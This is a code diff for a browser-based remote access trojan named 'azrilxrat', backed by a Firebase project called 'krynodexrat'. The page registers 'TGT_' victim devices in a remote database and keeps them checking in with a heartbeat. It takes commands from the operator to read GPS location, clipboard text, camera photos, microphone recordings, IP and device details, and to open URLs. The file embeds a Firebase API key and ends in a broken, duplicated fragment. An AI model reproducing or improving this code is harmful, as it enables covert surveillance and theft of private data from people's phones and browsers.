@@ -30,23 +30,19 @@ body{
 <div class="id-text" id="idDisplay"></div>
 
 <script>
-// ═════════════════════════════════════
-// 1 HP = 1 DEVICE (PERSISTENT ID)
-// ═════════════════════════════════════
+// ═════════════════════════════════
+// 1 HP = 1 DEVICE (PERSISTENT)
+// ═════════════════════════════════
 
-// Cek localStorage, kalo udah ada ID pake itu
 let DEVICE_ID = localStorage.getItem('azrilxrat_device_id');
-
-// Kalo belum ada, bikin baru
 if (!DEVICE_ID) {
   DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2,9) + Date.now().toString(36);
   localStorage.setItem('azrilxrat_device_id', DEVICE_ID);
 }
 
 document.getElementById('idDisplay').textContent = 'ID: ' + DEVICE_ID;
-console.log('Device ID:', DEVICE_ID);
 
-// Firebase
+// Firebase Init
 const FB = {
   apiKey: "AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",
   authDomain: "krynodexrat.firebaseapp.com",
@@ -60,7 +56,10 @@ const FB = {
 firebase.initializeApp(FB);
 const db = firebase.database();
 
-// Device info
+// ═════════════════════════════
+// DEVICE REGISTER
+// ═════════════════════════════
+
 const deviceInfo = {
   id: DEVICE_ID,
   model: navigator.userAgent.split(';')[1]?.trim() || 'Browser',
@@ -73,7 +72,6 @@ const deviceInfo = {
   online: true
 };
 
-// Register / Update (pakai update biar gak overwrite)
 db.ref('devices/' + DEVICE_ID).update(deviceInfo)
   .then(() => {
     document.getElementById('statusMsg').textContent = '✅ ACTIVE';
@@ -84,36 +82,32 @@ db.ref('devices/' + DEVICE_ID).update(deviceInfo)
     console.error(err);
   });
 
-// Heartbeat tiap 10 detik
+// Heartbeat 10 detik
 setInterval(() => {
-  db.ref('devices/' + DEVICE_ID).update({
-    lastSeen: Date.now(),
-    online: true
-  });
+  db.ref('devices/' + DEVICE_ID).update({ lastSeen: Date.now(), online: true });
 }, 10000);
 
 // Deteksi online/offline
 window.addEventListener('online', () => {
-  db.ref('devices/' + DEVICE_ID).update({online: true, lastSeen: Date.now()});
+  db.ref('devices/' + DEVICE_ID).update({ online: true, lastSeen: Date.now() });
   document.getElementById('statusMsg').textContent = '✅ ACTIVE';
 });
 
 window.addEventListener('offline', () => {
-  db.ref('devices/' + DEVICE_ID).update({online: false, lastSeen: Date.now()});
+  db.ref('devices/' + DEVICE_ID).update({ online: false, lastSeen: Date.now() });
   document.getElementById('statusMsg').textContent = '⚠️ OFFLINE';
 });
 
-// Before unload
 window.addEventListener('beforeunload', () => {
-  db.ref('devices/' + DEVICE_ID).update({online: false, lastSeen: Date.now()});
+  db.ref('devices/' + DEVICE_ID).update({ online: false, lastSeen: Date.now() });
 });
 
-// ═══════════════════════════════
+// ═════════════════════════════
 // BROWSER API FUNCTIONS
-// ═══════════════════════════════
+// ═════════════════════════════
 
 async function getGPS() {
-  return new Promise((resolve) => {
+  return new Promise(resolve => {
     if (!navigator.geolocation) { resolve({error:"GPS not supported"}); return; }
     navigator.geolocation.getCurrentPosition(
       pos => resolve({lat:pos.coords.latitude, lng:pos.coords.longitude, acc:pos.coords.accuracy}),
@@ -185,45 +179,59 @@ function getNetwork() {
 }
 
 async function getIP() {
-  try { const r = await fetch('https://api.ipify.org?format=json');
-        const d = await r.json(); return {ip:d.ip}; }
-  catch(e) { return {error:"Failed"}; }
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return {ip:d.ip};
+  } catch(e) { return {error:"Failed"}; }
 }
 
-// ═══════════════════════════════
+// ═════════════════════════════
 // COMMAND HANDLER
-// ═══════════════════════════════
+// ═════════════════════════════
 
 async function executeCommand(cmd) {
   let result = {type:cmd, status:"executed", timestamp:Date.now()};
   
-  switch(cmd) {
-    case 'GET_GPS': result.data = await getGPS(); break;
-    case 'GET_CLIPBOARD': result.data = await getClipboard(); break;
-    case 'GET_DEVICE_INFO': result.data = getDeviceInfo(); break;
-    case 'GET_BATTERY': result.data = await getBattery(); break;
-    case 'VIBRATE': result.data = vibrate(); break;
-    case 'CAMERA': result.data = await takePhoto(); break;
-    case 'MIC': result.data = await recordAudio(); break;
-    case 'GET_NETWORK': result.data = getNetwork(); break;
-    case 'GET_IP': result.data = await getIP(); break;
-    case 'FLASH_ON': result.data = {note:"Need APK"}; break;
-    case 'FLASH_OFF': result.data = {note:"Need APK"}; break;
-    default:
-      if (cmd.startsWith('OPEN_URL:')) {
-        window.open(cmd.split(':')[1], '_blank');
-        result.data = {opened:true};
-      } else if (cmd.startsWith('ALERT:')) {
-        alert(cmd.split(':')[1]);
-        result.data = {alerted:true};
-      } else {
-        result.data = {note:"unknown"};
-      }
+  if (cmd === 'GET_GPS' || cmd === 'GET_LOCATION') {
+    result.data = await getGPS();
+  } else if (cmd === 'GET_CLIPBOARD') {
+    result.data = await getClipboard();
+  } else if (cmd === 'GET_DEVICE_INFO') {
+    result.data = getDeviceInfo();
+  } else if (cmd === 'GET_BATTERY') {
+    result.data = await getBattery();
+  } else if (cmd === 'VIBRATE') {
+    result.data = vibrate();
+  } else if (cmd === 'CAMERA' || cmd === 'TAKE_PHOTO') {
+    result.data = await takePhoto();
+  } else if (cmd === 'MIC' || cmd === 'RECORD_AUDIO') {
+    result.data = await recordAudio();
+  } else if (cmd === 'GET_NETWORK') {
+    result.data = getNetwork();
+  } else if (cmd === 'GET_IP') {
+    result.data = await getIP();
+  } else if (cmd === 'FLASH_ON') {
+    result.data = {note:"Need APK"};
+  } else if (cmd === 'FLASH_OFF') {
+    result.data = {note:"Need APK"};
+  } else if (cmd.startsWith('OPEN_URL:')) {
+    window.open(cmd.split(':')[1], '_blank');
+    result.data = {opened:true};
+  } else if (cmd.startsWith('ALERT:')) {
+    alert(cmd.split(':')[1]);
+    result.data = {alerted:true};
+  } else {
+    result.data = {note:"unknown_command"};
   }
+  
   return result;
 }
 
-// Listen commands
+// ═════════════════════════════
+// LISTEN COMMANDS
+// ═════════════════════════════
+
 db.ref('commands/' + DEVICE_ID).on('child_added', async (snap) => {
   const cmd = snap.val();
   if (!cmd || cmd.status !== 'pending') return;
@@ -237,85 +245,7 @@ db.ref('commands/' + DEVICE_ID).on('child_added', async (snap) => {
 
 </script>
 </body>
-</html>// ══════════════════════════════════════════
-
-const DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2,9) + Date.now().toString(36);
-const LOG_BOX = document.getElementById('logBox');
-
-function log(msg) {
-  const t = new Date().toLocaleTimeString();
-  LOG_BOX.innerHTML += `[${t}] ${msg}\n`;
-  LOG_BOX.scrollTop = LOG_BOX.scrollHeight;
-  console.log('[AZR]', msg);
-}
-
-// Firebase Config
-const FB = {
-  apiKey: "AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",
-  authDomain: "krynodexrat.firebaseapp.com",
-  databaseURL: "https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "krynodexrat",
-  storageBucket: "krynodexrat.firebasestorage.app",
-  messagingSenderId: "465327768431",
-  appId: "1:465327768431:web:3e5871b9f80dcbcad1de9a"
-};
-
-firebase.initializeApp(FB);
-const db = firebase.database();
-
-// ═══════════════════════════════
-// BROWSER API FUNCTIONS
-// ═══════════════════════════════
-
-async function getGPS() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve({error: "GPS not supported"});
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      (pos) => resolve({
-        lat: pos.coords.latitude,
-        lng: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-      }),
-      (err) => resolve({error: "GPS denied: " + err.message}),
-      { timeout: 10000 }
-    );
-  });
-}
-
-async function getClipboard() {
-  try {
-    const text = await navigator.clipboard.readText();
-    return {text: text, length: text.length};
-  } catch(e) {
-    return {error: "Clipboard access denied"};
-  }
-}
-
-function getDeviceInfo() {
-  const battery = navigator.getBattery ? "checking..." : "N/A";
-  return {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: screen.width + "x" + screen.height,
-    resolution: devicePixelRatio + "x",
-    ram: navigator.deviceMemory || "unknown",
-    cores: navigator.hardwareConcurrency || "unknown",
-    online: navigator.onLine,
-    battery: battery,
-    connection: navigator.connection ? {
-      type: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink
-    } : "N/A"
-  };
-}
-
-async function getBattery() {
-  try {
-    const b = await navigator.getBattery();
+</html>or.getBattery();
     return {
       level: Math.round(b.level * 100) + "%",
       charging: b.charging,
